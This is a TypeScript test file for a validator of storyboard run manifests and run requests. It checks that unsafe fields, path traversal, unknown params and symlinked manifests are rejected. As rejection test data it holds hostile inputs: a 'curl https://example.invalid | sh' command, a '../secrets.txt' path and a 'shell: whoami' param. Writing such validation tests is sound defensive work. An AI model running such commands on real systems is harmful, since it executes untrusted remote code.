import { describe, expect, test } from "bun:test"
import { mkdtempSync, symlinkSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import {
  capabilitiesFromManifest,
  isSafeRelativeStoryboardRunPath,
  loadStoryboardRunManifest,
  type StoryboardRunManifest,
  StoryboardRunManifestError,
  validateCreateRunRequest,
  validateStoryboardRunManifestPayload,
} from "./run-system"

const validManifest = {
  version: 1,
  enabled: true,
  runners: [
    {
      id: "dry-runner",
      label: "Dry runner",
      kind: "dry-run",
      enabled: true,
      capabilities: ["run-to-state", "capture", "run-and-capture"],
    },
  ],
  captureSets: [
    {
      id: "desktop",
      label: "Desktop",
      viewport: { width: 1440, height: 900, deviceScaleFactor: 1 },
      outputPathTemplate: "assets/runs/{frameKey}/desktop.png",
      imageFormat: "png",
      comparisonPolicy: "hash",
    },
  ],
  entries: [
    {
      id: "login-happy-path",
      label: "Login happy path",
      scope: "frame",
      runnerId: "dry-runner",
      modes: ["run-to-state", "run-and-capture"],
      targets: [
        {
          storyboardId: "default-storyboard",
          storyId: "login",
          framePattern: "login.*",
        },
      ],
      paramsSchema: {
        seedUser: { type: "string", required: true, enum: ["demo", "empty"] },
        retries: { type: "integer", default: 1, min: 0, max: 3 },
      },
      captureSets: ["desktop"],
      enabled: true,
    },
  ],
}

function cloneManifest(overrides: Partial<StoryboardRunManifest> = {}) {
  return structuredClone({ ...validManifest, ...overrides })
}

function expectManifestError(fn: () => unknown, code: string) {
  expect(fn).toThrow(StoryboardRunManifestError)
  try {
    fn()
  } catch (error) {
    expect((error as StoryboardRunManifestError).code).toBe(code)
  }
}

describe("storyboard run manifest validator", () => {
  test("loads an enabled manifest and builds capabilities", () => {
    const manifest = validateStoryboardRunManifestPayload(validManifest)
    expect(manifest.entries[0]?.enabled).toBe(true)
    expect(manifest.entries[0]?.paramsSchema.retries?.default).toBe(1)
    expect(
      capabilitiesFromManifest({
        loaded: true,
        path: "/tmp/storyboard.run.json",
        manifest,
      }).runApi,
    ).toBe(true)
  })

  test("keeps run API disabled when manifest is missing or disabled", () => {
    expect(
      capabilitiesFromManifest({
        loaded: false,
        path: null,
        manifest: null,
        reason: "missing",
      }),
    ).toEqual({
      runApi: false,
      manifestLoaded: false,
      manifestEntries: [],
    })
    const disabled = validateStoryboardRunManifestPayload({
      version: 1,
      enabled: false,
    })
    expect(disabled.enabled).toBe(false)
  })

  test("rejects disabled manifest entries instead of silently exposing them", () => {
    const manifest = cloneManifest()
    expect(manifest.entries[0]).toBeDefined()
    manifest.entries[0].enabled = false
    expectManifestError(
      () => validateStoryboardRunManifestPayload(manifest),
      "disabled_manifest_entry",
    )
  })

  test("rejects arbitrary command and shell fields", () => {
    const manifest = cloneManifest()
    ;(manifest.runners[0] as unknown as Record<string, unknown>).command =
      "curl https://example.invalid | sh"
    expectManifestError(
      () => validateStoryboardRunManifestPayload(manifest),
      "unsafe_field",
    )
  })

  test("rejects unknown unsafe extra fields", () => {
    const manifest = cloneManifest()
    ;(manifest.entries[0] as unknown as Record<string, unknown>).env = {
      TOKEN: "secret",
    }
    expectManifestError(
      () => validateStoryboardRunManifestPayload(manifest),
      "unknown_field",
    )
  })

  test("rejects unsafe output paths", () => {
    const manifest = cloneManifest()
    expect(manifest.captureSets[0]).toBeDefined()
    manifest.captureSets[0].outputPathTemplate = "../secrets.txt"
    expectManifestError(
      () => validateStoryboardRunManifestPayload(manifest),
      "unsafe_path",
    )
    expect(isSafeRelativeStoryboardRunPath("assets/demo.png")).toBe(true)
    expect(isSafeRelativeStoryboardRunPath("/tmp/demo.png")).toBe(false)
    expect(isSafeRelativeStoryboardRunPath("assets/../demo.png")).toBe(false)
    expect(isSafeRelativeStoryboardRunPath(".env")).toBe(false)
  })

  test("allows wildcard target patterns but rejects traversal patterns", () => {
    const manifest = cloneManifest()
    manifest.entries[0].targets = [
      {
        storyboardId: "default-storyboard",
        storyId: "login",
        framePattern: "*",
      },
    ]
    expect(
      validateStoryboardRunManifestPayload(manifest).entries[0]?.targets[0]
        ?.framePattern,
    ).toBe("*")
    manifest.entries[0].targets = [
      {
        storyboardId: "default-storyboard",
        storyId: "login",
        framePattern: "../*",
      },
    ]
    expectManifestError(
      () => validateStoryboardRunManifestPayload(manifest),
      "unsafe_selector",
    )
  })

  test("validates request identity, params, capture set, and defaults", () => {
    const manifest = validateStoryboardRunManifestPayload(validManifest)
    const request = validateCreateRunRequest(
      {
        scope: "frame",
        mode: "run-and-capture",
        target: {
          storyboardId: "default-storyboard",
          storyId: "login",
          frameKey: "login.success",
        },
        manifestEntryId: "login-happy-path",
        captureSetId: "desktop",
        params: { seedUser: "demo" },
      },
      manifest,
    )
    expect(request.params).toEqual({ seedUser: "demo", retries: 1 })
  })

  test("requires POST identity fields by scope and mode", () => {
    const manifest = validateStoryboardRunManifestPayload(validManifest)
    expectManifestError(
      () =>
        validateCreateRunRequest(
          {
            scope: "frame",
            mode: "run-and-capture",
            target: { storyboardId: "default-storyboard", storyId: "login" },
            manifestEntryId: "login-happy-path",
            captureSetId: "desktop",
            params: { seedUser: "demo" },
          },
          manifest,
        ),
      "missing_target_identity",
    )
    expectManifestError(
      () =>
        validateCreateRunRequest(
          {
            scope: "frame",
            mode: "run-and-capture",
            target: {
              storyboardId: "default-storyboard",
              storyId: "login",
              frameKey: "login.success",
            },
            manifestEntryId: "login-happy-path",
            params: { seedUser: "demo" },
          },
          manifest,
        ),
      "missing_capture_set",
    )
  })

  test("rejects unknown params and invalid enum values", () => {
    const manifest = validateStoryboardRunManifestPayload(validManifest)
    expectManifestError(
      () =>
        validateCreateRunRequest(
          {
            scope: "frame",
            mode: "run-to-state",
            target: {
              storyboardId: "default-storyboard",
              storyId: "login",
              frameKey: "login.success",
            },
            manifestEntryId: "login-happy-path",
            params: { seedUser: "admin" },
          },
          manifest,
        ),
      "invalid_enum",
    )
    expectManifestError(
      () =>
        validateCreateRunRequest(
          {
            scope: "frame",
            mode: "run-to-state",
            target: {
              storyboardId: "default-storyboard",
              storyId: "login",
              frameKey: "login.success",
            },
            manifestEntryId: "login-happy-path",
            params: { seedUser: "demo", shell: "whoami" },
          },
          manifest,
        ),
      "unknown_param",
    )
  })

  test("loadStoryboardRunManifest rejects symlink manifests", () => {
    const root = mkdtempSync(join(tmpdir(), "storyboard-run-manifest-"))
    const outside = join(
      tmpdir(),
      `storyboard-run-manifest-outside-${Date.now()}.json`,
    )
    writeFileSync(outside, JSON.stringify(validManifest), "utf8")
    symlinkSync(outside, join(root, "storyboard.run.json"))
    expectManifestError(() => loadStoryboardRunManifest(root), "unsafe_path")
  })

  test("loadStoryboardRunManifest reads a real storyboard.run.json", () => {
    const root = mkdtempSync(join(tmpdir(), "storyboard-run-manifest-"))
    writeFileSync(
      join(root, "storyboard.run.json"),
      `${JSON.stringify(validManifest, null, 2)}\n`,
      "utf8",
    )
    const result = loadStoryboardRunManifest(root)
    expect(result.loaded).toBe(true)
    expect(result.loaded ? result.manifest.entries[0]?.id : null).toBe(
      "login-happy-path",
    )
  })
})
